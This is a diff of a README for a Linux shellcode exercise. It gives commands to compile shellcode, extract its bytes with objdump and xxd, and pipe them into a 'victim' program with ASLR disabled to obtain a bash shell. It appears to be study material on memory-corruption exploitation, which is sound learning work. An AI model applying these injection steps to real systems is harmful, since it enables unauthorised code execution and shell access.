@@ -1,38 +1,28 @@
-This doc is about how to make the shell code. 
-The test environment is Ubuntu 12.04 with Linux 3.11.
+Shellcode in Linux.
+The test environment is Linux lubuntu 4.4.0-34-generic #53-Ubuntu SMP Wed Jul 27 16:06:28 UTC 2016 i686 i686 i686 GNU/Linux.
 
 Contact: Harrys Kon
 Email: konharrys@gmail.com
 https://harryskon.com/
 
-1. exec /bin/sh with shellcode
-(1) Compile the shellcode source: gcc shell_exec.c -o shell_exec
-(2) Find the begin and end of shellcode in shell_exec with:
-    objdump -d shell_exec | sed -n '/shell_begin/,/shell_end/p' 
-	In our code, shell_begin is 0x4bf, shell_end is 0x4dc
-(3) Compute the length of expected shellcode:
-    echo $((0x4dc-0x4bf))
-	The length is 29 and we will choose 32 which is the multiple of 8.
-(4) xxd -s0x4bf -l32 -p shell_exec shellcode 
-(5) Compile the run program with: sh compile.sh
-(6) ((cat shellcode | xxd -r -p) ; cat) | ./run_shell
-(7) Now we have a bash shell.
+exec /bin/sh with shellcode
+------------------------------
+Steps
+(1) Compile: 
+" gcc shell.c -o shell "
+(2) Find the start and end of shellcode in shell:
+" objdump -d shell | sed -n '/shell_start/,/shell_end/p' "
+In my code, shell_begin is 0x3de, shell_end is 0x3f8
+(3) Find length of expected shellcode:
+" echo $((0x3f8-0x3de)) "
+The length is 26 and we will choose 32 which is the multiple of 8.
+(4) Round the shellcode length to 32 (next multiple of 8) and use xxd to convert the binary to char:
+" xxd -s0x3de -l32 -p shell shellcode " 
+(5) Compile the run program (make it executable via "chmod 755 cmpshell.sh")
+" ./cmpshell.sh "
+(6)  Attack our vulnerable program (also disable ASLR) and get a bash shell
+" ((cat shellcode | xxd -r -p) ; cat) | setarch `arch` -R ./victim "
 
-2. call sys_exit with shellcode
-(1) Compile the shellcode source: gcc shell_exit.c -o shell_exit
-(2) Find the begin and end of shellcode in shell_exit with:
-    objdump -d shell_exit | sed -n '/shell_begin/,/shell_end/p'
-	In our code, shell_begin is 0x4bf, shell_end is 0x4cf
-(3) Compute the length of expected shellcode:
-    echo $((0x4cf-0x4bf))
-	The length is 16. We will use 16 because it is the multiple of 8.
-(4) xxd -s0x4bf -l16 -p shell_exit shellcode
-(5) Compile the run program with: sh compile.sh
-(6) ((cat shellcode | xxd -r -p) ; cat) | ./run_shell
-(7) Check the return value of the program with "echo $?"
-    The return value is 20 in the shellcode.
-
-Notes:
-1. xxd is to convert the binary to char.
-   xxd -r is to convert the char to binary.
+Note:
+1. There is no prompt in the shell because the standard input is provided by cat, and not the terminal (/dev/tty).
 2. shellcode should not contain any NULL.
